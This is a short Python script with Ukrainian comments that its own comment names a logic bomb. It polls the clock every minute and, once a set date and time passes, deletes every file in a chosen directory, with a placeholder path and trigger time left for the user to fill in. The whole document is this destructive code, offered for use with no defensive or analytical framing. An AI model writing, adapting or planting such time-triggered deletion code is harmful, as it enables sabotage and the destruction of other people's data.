import os
import time

def delete_files(directory):
    # Отримати список файлів у заданому каталозі
    files = os.listdir(directory)
    
    # Пройтися по кожному файлу та видалити його
    for file in files:
        file_path = os.path.join(directory, file)
        try:
            os.remove(file_path)
            print(f"Видалено файл: {file_path}")
        except Exception as e:
            print(f"Помилка під час видалення {file_path}: {e}")

def main():
    # Задання значень: час та ім'я каталогу
    target_time = "2024-04-23 12:00:00"  # Задайте бажаний час для спрацювання логічної бомби
    directory = "/шлях/до/вашого/каталогу"  # Замініть на шлях до вашого каталогу
    
    while True:
        # Отримати поточний час
        current_time = time.strftime("%Y-%m-%d %H:%M:%S")
        
        # Перевірити, чи настав час активації
        if current_time >= target_time:
            # Викликати функцію видалення файлів
            delete_files(directory)
            break  # Вийти з циклу після активації
        
        # Затримка перед наступною перевіркою
        time.sleep(60)  # Перевірка кожну хвилину

if __name__ == "__main__":
    main()
